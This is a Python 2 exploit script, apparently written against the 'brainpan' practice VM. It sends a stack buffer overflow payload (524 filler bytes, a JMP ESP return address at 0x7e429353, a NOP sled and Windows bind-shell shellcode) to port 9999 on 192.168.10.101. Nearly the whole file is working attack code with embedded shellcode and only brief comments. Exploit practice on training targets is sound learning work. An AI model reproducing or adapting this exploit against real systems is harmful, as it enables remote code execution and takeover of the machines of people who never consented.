#! /usr/bin/python
# Name: Rio Atmadja
import socket 
import sys 

# shellcode: windows/shell_bind_tcp
shellcode = ("\xbb\x98\x46\x70\xe1\xdb\xcb\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x56\x83\xea\xfc\x31\x5a\x0f\x03\x5a\x97\xa4\x85\x1d\x4f\xa1"
"\x66\xde\x8f\xd2\xef\x3b\xbe\xc0\x94\x48\x92\xd4\xdf\x1d\x1e"
"\x9e\xb2\xb5\x95\xd2\x1a\xb9\x1e\x58\x7d\xf4\x9f\x6c\x41\x5a"
"\x63\xee\x3d\xa1\xb7\xd0\x7c\x6a\xca\x11\xb8\x97\x24\x43\x11"
"\xd3\x96\x74\x16\xa1\x2a\x74\xf8\xad\x12\x0e\x7d\x71\xe6\xa4"
"\x7c\xa2\x56\xb2\x37\x5a\xdd\x9c\xe7\x5b\x32\xff\xd4\x12\x3f"
"\x34\xae\xa4\xe9\x04\x4f\x97\xd5\xcb\x6e\x17\xd8\x12\xb6\x90"
"\x02\x61\xcc\xe2\xbf\x72\x17\x98\x1b\xf6\x8a\x3a\xe8\xa0\x6e"
"\xba\x3d\x36\xe4\xb0\x8a\x3c\xa2\xd4\x0d\x90\xd8\xe1\x86\x17"
"\x0f\x60\xdc\x33\x8b\x28\x87\x5a\x8a\x94\x66\x62\xcc\x71\xd7"
"\xc6\x86\x90\x0c\x70\xc5\xfc\xe1\x4f\xf6\xfc\x6d\xc7\x85\xce"
"\x32\x73\x02\x63\xbb\x5d\xd5\x84\x96\x1a\x49\x7b\x18\x5b\x43"
"\xb8\x4c\x0b\xfb\x69\xec\xc0\xfb\x96\x39\x46\xac\x38\x91\x27"
"\x1c\xf9\x41\xc0\x76\xf6\xbe\xf0\x78\xdc\xc9\x36\xb7\x04\x9a"
"\xd0\xba\xba\x0d\x7d\x32\x5c\x47\x6d\x12\xf6\xff\x4f\x41\xcf"
"\x98\xb0\xa3\x63\x31\x27\xfb\x6d\x85\x48\xfc\xbb\xa6\xe5\x54"
"\x2c\x3c\xe6\x60\x4d\x43\x23\xc1\x04\x7c\xa4\x9b\x78\xcf\x54"
"\x9b\x50\xa7\xf5\x0e\x3f\x37\x73\x33\xe8\x60\xd4\x85\xe1\xe4"
"\xc8\xbc\x5b\x1a\x11\x58\xa3\x9e\xce\x99\x2a\x1f\x82\xa6\x08"
"\x0f\x5a\x26\x15\x7b\x32\x71\xc3\xd5\xf4\x2b\xa5\x8f\xae\x80"
"\x6f\x47\x36\xeb\xaf\x11\x37\x26\x46\xfd\x86\x9f\x1f\x02\x26"
"\x48\xa8\x7b\x5a\xe8\x57\x56\xde\x18\x12\xfa\x77\xb1\xfb\x6f"
"\xca\xdc\xfb\x5a\x09\xd9\x7f\x6e\xf2\x1e\x9f\x1b\xf7\x5b\x27"
"\xf0\x85\xf4\xc2\xf6\x3a\xf4\xc6")

#jmp esp found at 0x7e429353
ret = "\x53\x93\x42\x7e"

#note: brainpan crashed after sending 700 bytes to the server
payload = '\x41' * 524 + ret + '\x90' * 16 + shellcode

#send evil payload to the target
print "Sending Evil buffer --> " + str(len(payload)) + " bytes"
connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	connect.connect(("192.168.10.101",9999))

except:

	print "[-] Connection Error"
	response = connect.recv(2000)
	print response
	sys.exit(1)

connect.recv(2000)
connect.send(payload + ' ' + '\r\n')
connect.close()




